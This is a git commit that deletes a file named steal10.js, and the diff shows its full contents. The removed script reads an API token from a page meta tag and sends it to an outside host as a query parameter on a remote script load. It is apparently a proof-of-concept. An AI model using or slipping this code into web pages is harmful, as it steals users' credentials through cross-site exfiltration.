30ff388ec6eb0501a388b9565c72e49fa28408b8
michan10232 <44373893+michan10232@users.noreply.github.com>
2025-05-05 23:25:41 +0800

    Delete steal10.js

--- steal10.js
+++
@@ -1,9 +0,0 @@
-(function poll() {
-  const meta = document.querySelector('meta[name="gq-api-token"]');
-  if (!meta) return setTimeout(poll, 500);
-
-  const token = encodeURIComponent(meta.content);
-  const s = document.createElement('script');
-  s.src = 'https://cdn.jsdelivr.net/gh/michan10232/poc/leak.js?token=' + token;
-  document.body.appendChild(s);
-})();
